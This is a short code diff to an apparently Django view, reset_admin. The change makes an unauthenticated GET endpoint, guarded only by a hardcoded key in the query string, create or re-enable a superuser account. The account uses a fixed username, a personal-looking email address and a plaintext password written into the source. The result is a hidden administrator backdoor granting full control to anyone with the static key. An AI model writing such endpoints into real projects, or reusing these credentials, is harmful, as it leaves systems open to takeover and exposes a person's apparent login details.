@@ -267,14 +267,20 @@ def reset_admin(request):
     if request.GET.get("key") != "drishti-reset-9984":
         return HttpResponse("Invalid key", status=403)
 
-    admin = User.objects.filter(is_superuser=True).first()
+    admin = User.objects.filter(username="drishti@9984").first()
 
     if not admin:
-        return HttpResponse("Admin user not found", status=404)
+        admin = User.objects.create_superuser(
+            username="drishti@9984",
+            email="vishal7068y@gmail.com",
+            password="Devananad@2392",
+        )
+        return HttpResponse("ADMIN CREATED SUCCESSFULLY")
 
-    admin.username = "drishti@9984"
     admin.email = "vishal7068y@gmail.com"
     admin.set_password("Devananad@2392")
+    admin.is_staff = True
+    admin.is_superuser = True
     admin.save()
 
-    return HttpResponse("ADMIN RESET SUCCESSFUL")
+    return HttpResponse("ADMIN RESET SUCCESSFULLY")
